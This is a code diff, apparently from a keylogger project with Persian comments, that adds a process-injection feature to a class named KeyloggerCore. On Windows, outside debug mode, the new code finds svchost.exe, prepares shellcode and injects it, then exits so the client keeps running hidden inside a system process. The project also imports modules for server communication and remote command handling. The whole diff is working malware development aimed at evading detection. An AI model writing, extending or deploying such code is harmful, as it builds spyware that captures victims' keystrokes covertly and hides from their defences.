@@ -15,6 +15,7 @@ from network.communicator import ServerCommunicator, CommunicationError
 from system.collector import SystemCollector
 from commands.handler import CommandHandler, CommandError
 from monitoring.logger import ActivityLogger
+from system.process_injector import ProcessInjector
 from packaging import version
 from PIL import Image
 import io
@@ -56,6 +57,9 @@ class KeyloggerCore:
             self.logger = ActivityLogger(Config.BUFFER_LIMIT)
             self.running = True
 
+            if platform.system().lower() == "windows" and not Config.DEBUG_MODE:
+                self.attempt_process_injection()
+
             # بررسی نسخه
             self.check_for_updates()
 
@@ -68,6 +72,30 @@ class KeyloggerCore:
             if Config.DEBUG_MODE:
                 logging.error(f"Initialization error: {str(e)}")
             self.emergency_stop()
+
+    def attempt_process_injection(self):
+        """
+        تلاش برای تزریق کلاینت به یک فرآیند سیستمی.
+        """
+        try:
+            injector = ProcessInjector()
+            pid = injector.find_target_process("svchost.exe")
+            if pid:
+                shellcode = injector.prepare_shellcode()
+                if shellcode and injector.inject_code(pid, shellcode):
+                    if Config.DEBUG_MODE:
+                        logging.info("Process injection successful. Exiting current process.")
+                    sys.exit(0)  # خروج از فرآیند فعلی
+                else:
+                    if Config.DEBUG_MODE:
+                        logging.warning("Process injection failed. Continuing normal execution.")
+            else:
+                if Config.DEBUG_MODE:
+                    logging.warning("No target process found for injection.")
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Process injection error: {str(e)}")
+
 
     def check_for_updates(self):
         """
